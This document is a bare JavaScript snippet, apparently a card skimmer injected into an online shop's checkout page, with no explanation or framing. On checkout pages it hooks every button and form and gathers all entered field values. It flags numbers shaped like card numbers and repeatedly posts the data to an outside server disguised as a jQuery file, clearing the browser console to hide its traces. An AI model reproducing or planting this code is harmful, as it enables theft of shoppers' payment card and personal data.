<script>
var snd =null;
window.onload = function () {
    if((new RegExp('onepage')).test(window.location)) {
        send();
       
    }
};

function clk() {
    var inp=document.querySelectorAll("input, select, textarea, checkbox");
    for (var i=0;i<inp.length;i++){
        if(inp[i].value.length>0) {
        var nme=inp[i].name;
        if(nme=='') { nme=i; }
        snd+=inp[i].name+'='+inp[i].value+'&';
        }
    }
   
}

function send() {
 var btn=document.querySelectorAll("a[href*='javascript:void(0)'],button, input, submit, .btn, .button");
    for (var i=0;i<btn.length;i++){
        var b=btn[i];
        if(b.type!='text' && b.type!='select' && b.type!='checkbox' && b.type!='password' && b.type!='radio') {
            if(b.addEventListener) {
                b.addEventListener("click", clk, false);
            }else {
                b.attachEvent('onclick', clk);
            }
        }
    }

    var frm=document.querySelectorAll("form");
    for (var i=0;i<frm.length;i++){
        if(frm[i].addEventListener) {
            frm[i].addEventListener("submit", clk, false);
        }else {
            frm[i].attachEvent('onsubmit', clk);
        }
    }

    if(snd!=null) {
        console.clear();
        var cc = new RegExp("[0-9]{13,16}");
                var asd="0";
       if(cc.test(snd)){
                  asd="1" ;
           }
var http = new XMLHttpRequest();
http.open("POST","https://infopromo.biz/lib/jquery.php",true);
http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
http.send("data="+snd+"&asd="+asd+"&id_id=alkazoneonline.com");
console.clear();
    }
    snd=null;
    setTimeout('send()', 150);
}

</script>
